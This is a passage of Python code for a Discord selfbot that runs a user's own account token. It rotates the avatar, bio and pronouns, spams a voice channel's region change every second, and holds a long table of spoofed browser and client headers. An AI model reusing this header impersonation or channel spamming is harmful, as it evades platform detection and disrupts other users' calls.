        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJkZXNpZ25faWQiOjB9"
    }
    
    with open(image_path, "rb") as f:
        image_data = base64.b64encode(f.read()).decode()
    
    payload = {
        "avatar": f"data:image/jpeg;base64,{image_data}"
    }

    response = sesh.patch("https://discord.com/api/v9/users/@me", json=payload, headers=headers)
    if response.status_code == 200:
        print("Profile picture changed successfully.")
    else:
        print(f"Error: {response.status_code}, {response.text}")

async def randomize_profile_picture(hours):
    if not os.path.exists('rotatepfp'):
        print("Error: 'rotatepfp' folder not found.")
        return
    
    while True:
        pfp_files = [file for file in os.listdir('rotatepfp') if file.lower().endswith(('.png', '.jpg', '.jpeg', '.gif'))]
        
        if not pfp_files:
            print("Error: No valid image files found in 'rotatepfp' folder.")
            break
        
        pfp_file = random.choice(pfp_files)
        file_path = os.path.join('rotatepfp', pfp_file)
        
        change_profile_picture(file_path)
        
        await asyncio.sleep(hours * 3600)

@bot.command()
async def rotatepfp(ctx, hours: int):
    await ctx.send(f"```Starting profile picture rotation every {hours} hour(s).```")
    await randomize_profile_picture(hours)

@bot.command()
async def stoprandomizepfp(ctx):
    global randomize_task
    if randomize_task:
        randomize_task.cancel()
        randomize_task = None
        await ctx.send("```Stopped randomizing profile picture.```")
    else:
        await ctx.send("```No active randomization task to stop.```")


regions = ["us-west", "us-east", "us-central", "us-south", "rotterdam", "hongkong", "japan", "brazil", "singapore", "sydney", "russia"]
spamregion_task = None

@bot.command()
async def spamregion(ctx, channel: discord.VoiceChannel):
    global spamregion_task
    
    if spamregion_task and not spamregion_task.done():
        await ctx.send("```A region change task is already running.```")
        return

    await ctx.send(f"```Starting to change the region of {channel.name}.```")

    async def change_region():
        while True:
            for region in regions:
                try:
                    if region != channel.rtc_region:
                        await channel.edit(rtc_region=region)
                    await asyncio.sleep(1)  
                except discord.Forbidden:
                    await ctx.send("```I do not have permission to change the region of this channel.```")
                    return
                except discord.HTTPException as e:
                    await ctx.send(f"```Error changing region: {e}```")
                    return
                except Exception as e:
                    await ctx.send(f"```Unexpected error: {e}```")
                    return

    spamregion_task = asyncio.create_task(change_region())

@bot.command()
async def stopspamregion(ctx):
    global spamregion_task
    if spamregion_task and not spamregion_task.done():
        spamregion_task.cancel()  
        spamregion_task = None
        await ctx.send("```Stopped changing region.```")
    else:
        await ctx.send("```No region change task running.```")


rotate_bio_task = None
bio_phrases = []
bio_index = 0

@bot.command()
async def rotatebio(ctx, *phrases):
    global rotate_bio_task, bio_phrases, bio_index

    if not phrases:
        await ctx.send("```Usage: .rotatebio <text1> <text2> <text3> ...```")
        return

    bio_phrases = phrases
    bio_index = 0

    if rotate_bio_task and not rotate_bio_task.done():
        rotate_bio_task.cancel()

    rotate_bio_task = asyncio.create_task(bio_rotator())
    await ctx.send("```Started rotating bio.```")

async def bio_rotator():
    global bio_index

    headers = {
        "Content-Type": "application/json",
        "Authorization": bot.http.token
    }
    url_api_info = "https://discord.com/api/v9/users/%40me/profile"

    while bio_phrases:
        new_bio = {"bio": bio_phrases[bio_index]}

        try:
            response = requests.patch(url_api_info, headers=headers, json=new_bio)
            if response.status_code == 200:
                print(f"Bio updated to: {bio_phrases[bio_index]}")
            else:
                print(f"Failed to update bio: {response.status_code} - {response.json()}")

            bio_index = (bio_index + 1) % len(bio_phrases)

        except Exception as e:
            print(f"An error occurred: {e}")
            return
        await asyncio.sleep(3600)

@bot.command()
async def stoprotatebio(ctx):
    global rotate_bio_task

    if rotate_bio_task and not rotate_bio_task.done():
        rotate_bio_task.cancel()
        rotate_bio_task = None
        await ctx.send("```Stopped rotating bio.```")
    else:
        await ctx.send("```No bio rotation task is running.```")

pronoun_rotation_task = None
@bot.command()
async def rotatepronoun(ctx, *pronouns):
    global pronoun_rotation_task

    if pronoun_rotation_task and pronoun_rotation_task.is_running():
        pronoun_rotation_task.cancel()
        await ctx.send("```Stopped previous pronoun rotation.```")

    if not pronouns:
        await ctx.send("```Please provide at least two pronouns to rotate.```")
        return

    pronoun_rotation_task = PronounRotationTask(ctx, pronouns)
    pronoun_rotation_task.start()
    await ctx.send(f"```Started rotating pronouns: {', '.join(pronouns)}```")

@bot.command()
async def stoprotatepronoun(ctx):
    global pronoun_rotation_task

    if pronoun_rotation_task and pronoun_rotation_task.is_running():
        pronoun_rotation_task.cancel()
        await ctx.send("```Stopped rotating pronouns.```")
    else:
        await ctx.send("```No pronoun rotation task running.```")

class PronounRotationTask:
    def __init__(self, ctx, pronouns):
        self.ctx = ctx
        self.pronouns = pronouns
        self.index = 0

    def start(self):
        self.task = asyncio.create_task(self.rotate_pronouns())

    def cancel(self):
        self.task.cancel()

    def is_running(self):
        return not self.task.done()

    async def rotate_pronouns(self):
        headers = {
            "Authorization": bot.http.token,
            "Content-Type": "application/json"
        }
        url_api_info = "https://discord.com/api/v9/users/%40me/profile"

        while True:
            try:
                current_pronoun = self.pronouns[self.index]
                self.index = (self.index + 1) % len(self.pronouns)

                response = requests.patch(url_api_info, headers=headers, json={"pronouns": current_pronoun})

                if response.status_code == 200:
                    await self.ctx.send(f"```Pronoun updated to: {current_pronoun}```")
                else:
                    await self.ctx.send(f"```Failed to update pronoun: {response.status_code} - {response.json()}```")
                    break

                await asyncio.sleep(3600)

            except Exception as e:
                await self.ctx.send(f"```An error occurred: {e}```")
                break


rotation_tasks = {}  
DISCORD_HEADERS = {
    "standard": {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-discord-timezone": "America/New_York",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIxLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDY4NCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    },

    "client": {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3fQ=="
    },

    "mobile": {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Google Chrome";v="121", "Not A(Brand";v="99", "Chromium";v="121"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "user-agent": "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IkFuZHJvaWQiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiUGl4ZWwgNiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMzsgUGl4ZWwgNikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMS4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEyMS4wLjAuMCIsIm9zX3ZlcnNpb24iOiIxMyIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTA2ODQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    },

    "firefox": {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.5",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEyMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEyMi4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIyLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjUwNjg0LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
    },

    "byoass": {
            "authority": "discord.com",
            "method": "PATCH",
            "scheme": "https",
            "accept": "/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "authorization": bot.http.token,
            "origin": "https://discord.com/",
            "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Asia/Calcutta",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJkZXNpZ25faWQiOjB9"
    },

    "desktop": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108"',
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3fQ=="
    },

    "electron": {
        "authority": "discord.com",
        "method": "PATCH",
        "path": "/api/v9/users/@me",
        "scheme": "https",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9021 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIxIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI2MjEiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjEgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzgsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE4fQ=="
    },

    "opera": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Opera GX";v="105", "Chromium";v="119", "Not?A_Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiT3BlcmEgR1giLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIxIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI2MjEiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExOS4wLjAuMCBTYWZhcmkvNTM3LjM2IE9QUi8xMDUuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMDUuMC4wLjAiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzgsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE4fQ=="
    },

    "legacy": {
        "authority": "discord.com",
        "method": "PATCH",
        "scheme": "https",
        "accept": "/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "origin": "https://discord.com/",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "X-Debug-Options": "bugReporterEnabled",
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "America/New_York",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3fQ=="
    },

    "brave": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Brave";v="122", "Chromium";v="122", "Not(A:Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQnJhdmUiLCJkZXZpY2UiOiIiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIyLjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMjIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjUwNjg0LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
    },

    "edge": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Microsoft Edge";v="122", "Chromium";v="122", "Not(A:Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiTWljcm9zb2Z0IEVkZ2UiLCJkZXZpY2UiOiIiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIyLjAuMC4wIFNhZmFyaS81MzcuMzYgRWRnLzEyMi4wLjAuMCIsImJyb3dzZXJfdmVyc2lvbiI6IjEyMi4wLjAuMCIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTA2ODQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    },

    "safari": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6Ik1hYyBPUyBYIiwiYnJvd3NlciI6IlNhZmFyaSIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNi41IFNhZmFyaS82MDUuMS4xNSIsImJyb3dzZXJfdmVyc2lvbiI6IjE2LjUiLCJvc192ZXJzaW9uIjoiMTAuMTUuNyIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTA2ODQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    },


    "ipad": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
